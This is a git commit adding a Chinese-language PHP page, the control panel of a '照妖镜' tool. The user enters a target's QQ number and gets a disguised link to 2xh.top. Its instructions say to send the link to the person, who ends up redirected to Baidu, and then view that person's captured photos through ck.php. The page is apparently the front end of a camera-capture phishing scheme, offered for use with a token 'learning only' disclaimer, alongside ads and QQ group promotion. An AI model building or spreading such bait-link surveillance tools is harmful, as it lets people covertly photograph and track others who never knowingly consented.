d270b499d70d362cca037e218dc3abceb04ed43b
cn-g-lc <100521199+cn-g-lc@users.noreply.github.com>
2022-03-20 19:19:32 +0800

    wz

---
+++ sc.php
@@ -0,0 +1,199 @@
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>照妖镜</title>
+    <meta name="keywords" content="照妖镜">
+    <meta name="description" content="照妖镜">
+    <link rel="stylesheet" href="static/css/bootstrap.min.css">
+    <script src="static/js/jquery.min.js"></script>
+    <script src="static/js/bootstrap.min.js"></script>
+  </head>
+	<script src="static/js/sweetalert.min.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      function getNowFormatDate() {
+        var date = new Date();
+        var month = date.getMonth() + 1;
+        var strDate = date.getDate();
+        var currentdate = month + "月" + strDate + "日";
+        return currentdate;
+      }
+      var text = [
+        "网站链接最近会更改！",
+        "请加群获取最新链接，谢谢！",
+        "请帮忙分享一下,这样我才有动力更新！",
+        "作者联系方式在下方,邮箱就是联系方式",
+        "需要开分站、主站、引流、商业广告等请联系邮箱！",
+      ], content = "";
+      for (var i = 0; i < text.length; i++) {
+        content += (i + 1) + ". " + text[i] + "\n";
+      }
+      setTimeout(function () {
+        swal(getNowFormatDate() + "通知", content, "success");
+      }, 1000)
+    })
+  </script>
+</body>
+  <style>
+	body{
+		margin: 0 auto;
+		text-align: center;
+	}
+	.container {
+	  max-width: 580px;
+	  padding: 15px;
+	  margin: 0 auto;
+	}
+</style>
+</body>
+</body>
+  <body style="background-image: url(static/images/0080xek2ly1gp5p3rfx4vj30rs0i4abh.jpg);background-attachment: fixed;background-repeat: no-repeat;background-size: cover;-moz-background-size: cover;">
+    <div class="container">
+      <div class="header">
+        <ul class="nav nav-pills pull-right" role="tablist">
+          <li role="presentation" class="active">
+            <a href="sc.php">后台设置</a></li>
+          <li role="presentation">
+            <a href="https://www.fanghong.net/">链接缩短</a></li>
+          <li role="presentation">
+               <a href="https://jq.qq.com/?_wv=1027&k=gq0sqnrW">源码下载</a></li>
+          <li role="presentation">
+            <a href="https://jq.qq.com/?_wv=1027&k=gq0sqnrW"><font color="#FF0000">获取新链接</font></a></li>
+        </ul>
+        <h3 class="text-muted" align="left">照妖镜</h3></div>
+<hr>
+      <marquee>
+                <a target="_blank" href="https://jq.qq.com/?_wv=1027&k=gq0sqnrW"><font size="250px" color="#ff0000">①点击这里加不禁言群:667307684</font>
+                <font size="250px" color="#FF77FF">②如果你钱多可以赞助本站来优化网站速度!联系下方邮箱</font>
+                <font size="250px" color="#e600ff">③觉得网站好的话帮忙推广一下~这样我才有动力!</font>
+                <font size="250px" color="#FF1493">④更新时间:2021年4月14日03:23:00</font></a>
+             </marquee>
+<div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
+        <div class="panel-heading bk-bg-primary">
+          <h6>
+            <span class="panel-title">照妖镜</span>
+            </h6>
+        </div>
+        <div class="panel-body">
+<script>
+function  create() {
+    var input = document.getElementById('content');
+    var kd = document.getElementById('kd');
+    var myid = document.getElementById('myid');
+    var url = {value:"http://www.baidu.com"};
+    if (myid.value=="" || url.value==""){
+        alert("ID或跳转地址不能为空！");
+        return false;
+    }
+    var myid1 = myid;
+    kd.href = 'https://www.2xh.top/?id='+myid.value+'&url='+url.value; 
+    kd.style = ''; 
+    kd.innerText = 'https://www.2xh.top/?id='+myid.value+'&url='+url.value; 
+}
+   </script>
+      <form role="form" action="##" onsubmit="return false" method="post" id="CreatDwz">
+          <div class="container-fluid">
+        </div>
+				<div class="panel-body">
+            <input type="text" style="background: rgba(255, 251, 251, 0.7)" class="form-control" id="myid" value= '' placeholder="请输入对方QQ生成链接">
+               <br>
+             <input type= "button" class="btn btn-primary btn-block" value= '生成链接'  onclick= 'create();'  />
+             <br>
+             <a id="kd" style="pointer-events: none;">请先生成链接！</a>
+				</form>
+		</div>
+          <div class="tip"></div>
+        </div>
+      </div>
+      <div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
+          <div class="panel-body">
+            <input type="text" style="background: rgba(255, 251, 251, 0.7)" class="form-control" id="myid1" value= '' placeholder="请输入对方QQ查询照片">
+            <br>
+            <input type= "button" class="btn btn-primary btn-block" value= '查看照片'  onclick=window.location.href='ck.php?id='+document.getElementById('myid1').value> 
+           </div>
+          <a href="https://www.fanghong.net/" class="btn btn-default btn-sm">
+            <span class="fa fa-users"></span> 短链接生成</a><br>
+            <a target="_blank" href="https://jq.qq.com/?_wv=1027&k=gq0sqnrW">
+            一定要加群,链接随时改！群号:667307684
+            <img border="0" src="static/picture/0080xek2ly1gp5p5lt0fij302i00mq2p.jpg" alt="点击加入QQ群" title="点击加入QQ群" width="100px" height="20px"><br><font color="#ff0000">删照片请加群！</font></a>
+      </div>
+      <div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
+        <div class="panel-body">
+          <div class="alert alert-info" role="alert">
+            <br>★作者声明★
+            <br>①本工具仅做学习交流使用,请勿用于非法用途!后果自负!网站拍照是用户自愿点击允许,最终解释权星火工作室
+            <br>②懒得做数据库,QQ是查看照片的凭证,不要泄露给知道这个平台的人
+            <br>③如有侵权、肖像权等,请联系本站下方邮箱删除！
+            <br>★使用说明★
+            <br>①填写对方QQ方便日后查询!填写完成后不用管直接点击生成!
+            <br>②生成完成后,复制链接发给你要查询的人
+            <br>③他点开后,然后回到本站,填写对方QQ,然后点击查看照片即可！
+            <br>④我再说一遍,填写要么数字要么QQ,小学生滚,写你妈逼英文和中文呢？
+            <br>⑤由于系统安全机制，ios系统必须使用自带的Safari浏览器（或者第三方APP调用的是Safari内核）才行<br>
+            <br>仅供娱乐使用,请勿用于非法商业用途,否则后果自负！
+            <br>请收藏本站,以防丢失
+            <font color="#e600ff"><br>星火Q：2207072324</font>
+            <br>
+            <hr class="top_hr_style02">
+			<body bgcolor="#ffd200"><span id="localtime"></span>
+	</nav></header>
+                <script type="text/javascript">
+                    function showLocale(objD) {
+                        var str, colorhead, colorfoot;
+                        var yy = objD.getYear();
+                        if (yy < 1900) yy = yy + 1900;
+                        var MM = objD.getMonth() + 1;
+                        if (MM < 10) MM = '0' + MM;
+                        var dd = objD.getDate();
+                        if (dd < 10) dd = '0' + dd;
+                        var hh = objD.getHours();
+                        if (hh < 10) hh = '0' + hh;
+                        var mm = objD.getMinutes();
+                        if (mm < 10) mm = '0' + mm;
+                        var ss = objD.getSeconds();
+                        if (ss < 10) ss = '0' + ss;
+                        var ww = objD.getDay();
+                        if (ww == 0) colorhead = "<font color=\"#FF3030\">";
+                        if (ww > 0 && ww < 6) colorhead = "<font color=\"#FF3030\">";
+                        if (ww == 6) colorhead = "<font color=\"#FF3030\">";
+                        if (ww == 0) ww = "星期日";
+                        if (ww == 1) ww = "星期一";
+                        if (ww == 2) ww = "星期二";
+                        if (ww == 3) ww = "星期三";
+                        if (ww == 4) ww = "星期四";
+                        if (ww == 5) ww = "星期五";
+                        if (ww == 6) ww = "星期六";
+                        colorfoot = "</font>"
+                        str = colorhead + yy + "-" + MM + "-" + dd + "丨" + hh + ":" + mm + ":" + ss + "丨" + ww + colorfoot;
+                        return (str);
+                    }
+                    function tick() {
+                        var today;
+                        today = new Date();
+                        document.getElementById("localtime").innerHTML = showLocale(today);
+                        window.setTimeout("tick()", 1000);
+                    }
+                    tick();
+                </script>
+            <br>
+        <p style="text-align:center">
+          <br>&copy; Powered by
+          <a href="?">星火</a>!</p>
+            <a target="_blank" href="http://www.xh99.top/">
+            <img border="0" src="static/picture/星火辅助网.png" alt="点击咨询" title="点击咨询" width="100%" height="100px"><br></a>
+            <a target="_blank" href="http://www.xh99.top/">
+            <img border="0" src="static/picture/星火辅助网.png" alt="点击咨询" title="点击咨询" width="100%" height="100px"><br></a>
+            <a target="_blank" href="http://www.xh99.top/">
+            <img border="0" src="static/picture/星火辅助网.png" alt="点击咨询" title="点击咨询" width="100%" height="100px"><br></a>
+            <a target="_blank" href="http://www.xh99.top/">
+            <img border="0" src="static/picture/星火辅助网.png" alt="点击咨询" title="点击咨询" width="100%" height="100px"><br></a>
+            <a target="_blank" href="http://www.xh99.top/">
+            <img border="0" src="static/picture/星火辅助网.png" alt="点击咨询" title="点击咨询" width="100%" height="100px"><br></a>
+</div>
+<audio autoplay>
+<source src="https://api.uomg.com/api/rand.music?sort=热歌榜" type="audio/mpeg">
+</audio>
+  </body>
+</html>
